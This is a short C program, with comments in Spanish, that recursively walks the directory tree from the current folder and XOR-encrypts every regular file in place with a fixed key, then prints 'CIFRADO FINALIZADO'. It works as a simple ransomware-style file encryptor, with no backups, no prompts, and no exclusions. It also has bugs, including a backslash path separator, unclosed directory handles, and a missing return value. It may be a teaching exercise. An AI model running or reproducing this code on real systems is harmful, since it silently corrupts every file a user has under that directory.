#include <stdio.h>
#include <stdlib.h>
#include <dirent.h> 
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <sys/types.h>
#define CYPHER_CODE 0x69

int cypher_rec(char []); 
int cypher(FILE *);

int main() {
  char directory_name[PATH_MAX] = ".";

  cypher_rec(directory_name);
  printf("CIFRADO FINALIZADO");

  return 0;
}

int cypher_rec(char dir_origin[]) {
  struct dirent *dir_element;
  struct stat file_info;
  FILE *file_element;
  DIR *directory = opendir(dir_origin);
  char dir_path[PATH_MAX];

  while ((dir_element = readdir(directory)) != NULL) {
    // Concatena el directorio de origen con el nombre del elemento
    // Con esto después hace la llamada recursiva si es necesario y abre archivos
    snprintf(dir_path, PATH_MAX, "%s\\%s", dir_origin, dir_element->d_name);
    stat(dir_path, &file_info);
    printf("DIR: %X\n", file_info.st_mode);

    // Si es un archivo regular
    if ((file_info.st_mode & S_IFMT) == S_IFREG) {
      // Trata de abrir el archivo
      file_element = fopen(dir_path, "r+b");

      // Si existe encripta
      if (file_element) {
        cypher(file_element);
        fclose(file_element);
      }
    } 
    // Si es un directorio
    else if ((file_info.st_mode & S_IFMT) == S_IFDIR){
      if (strcmp(dir_element->d_name, ".") && strcmp(dir_element->d_name, "..")) {
        cypher_rec(dir_path);
      }
    }
  }
}

int cypher(FILE * file) {
  int byte;

  while ((byte = getc(file)) != EOF) {
    // getc avanza el puntero asi que hay que volver atras
    fseek(file, -1, SEEK_CUR);
    // XOR al byte leido
    fputc(byte ^ CYPHER_CODE, file);

    // Aplico los cambios y me posiciono en el siguiente caracter
    fflush(file);
    fseek(file, 0, SEEK_CUR); 
  }

  return 1;
}